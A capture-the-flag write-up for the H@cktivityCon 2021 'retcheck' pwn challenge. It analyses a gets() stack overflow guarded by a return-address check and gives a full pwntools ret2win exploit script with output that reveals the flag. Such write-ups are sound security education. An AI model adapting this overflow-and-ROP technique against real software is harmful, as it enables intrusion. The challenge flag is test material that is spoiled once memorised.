# H@cktivityCon 2021 CTF

## retcheck


> Stack canaries are overrated. 
> 
> 277
> 
> [`retcheck`](retcheck)
>
> author: @M_alpha#3534

Tags: _pwn_ _bof_ _rop_ _x86-64_ _ret2win_


## Summary

Basic ret2win, one function removed.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE/Canary, easy BOF/ROP.
    

### Decompile with Ghidra

```c
void vuln(void)
{
  size_t sVar1;
  long in_stack_00000000;
  char local_198 [400];
  
  RETADDR = in_stack_00000000;
  puts("retcheck enabled !!");
  gets(local_198);
  sVar1 = strcspn(local_198,"\r\n");
  local_198[sVar1] = '\0';
  if (in_stack_00000000 != RETADDR) {
    abort();
  }
  return;
}
```

`gets` is the vulnerability, and easy to exploit since no PIE or canary.  However, there is a check that the return address (on stack) was not overwritten; kinda necessary to start a ROP chain.  No worries, we'll overwrite the `main` return address instead:

```
0x00007fffffffe350│+0x0190: 0x00007fffffffe360  →  0x0000000000000000	 ← $rbp
0x00007fffffffe358│+0x0198: 0x0000000000401465  →  <main+18> mov eax, 0x0
0x00007fffffffe360│+0x01a0: 0x0000000000000000
0x00007fffffffe368│+0x01a8: 0x00007ffff7de70b3  →  <__libc_start_main+243> mov edi, eax
```

From GDB/GEF (above) you can see the return address back to main just below the preserved base pointer.  But then down stack two more lines you can see the return address for the `main` function.

So, just send `0x198` (see `local_198` above) of garbage followed by `0x401465` (the expected return back to main address) a `0x0`, then the address of the `win` function (not shown, just decompile yourself).

> The return address is a poor choice as a canary, especially with PIE disable since the return address is deterministic with static analysis.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./retcheck')

if args.REMOTE:
    p = remote('challenge.ctf.games', 31463)
else:
    p = process(binary.path)

payload  = b''
payload += 0x198 * b'A'
payload += p64(0x401465)
payload += p64(0)
payload += p64(binary.sym.win)

p.sendlineafter(b'\n',payload)
p.stream()
```

Nothing else to explain.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/hacktivityctf2021/retcheck/retcheck'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenge.ctf.games on port 31463: Done
flag{a73dc20c1cd1f918ae7b591e8625e349}
```
